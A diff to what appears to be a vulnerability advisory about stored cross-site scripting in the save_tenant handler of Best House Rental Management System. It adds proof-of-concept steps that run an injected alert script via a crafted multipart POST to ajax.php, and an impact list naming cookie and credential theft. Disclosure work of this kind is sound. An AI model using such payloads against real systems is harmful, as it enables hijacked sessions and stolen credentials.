@@ -18,7 +18,7 @@ The `save_tenant` function in `admin_class.php` of the **Best House Rental Manag
 
 ### **Payload Used**
 
-```http
+```sh
 POST /rental/ajax.php?action=save_tenant HTTP/1.1
 Host: localhost
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
@@ -70,3 +70,15 @@ Content-Disposition: form-data; name="date_in"
 
 12
 -----------------------------3178982332774785074212688258--
+```
+
+### **Proof of Concept**
+
+Submit the above POST request to the `/rental/ajax.php?action=save_tenant` endpoint. Open the tenants page at `/rental/index.php?page=tenants`. Observe that the injected JavaScript `<script>alert('XSS')</script>` executes, demonstrating the XSS vulnerability.
+
+### **Impact**
+An attacker can inject arbitrary JavaScript into the application, which will execute whenever the affected page is accessed
+This can lead to:
+* Theft of session cookies or user credentials.
+* Unauthorized actions on behalf of users.
+* Malicious redirection or delivery of malicious content.
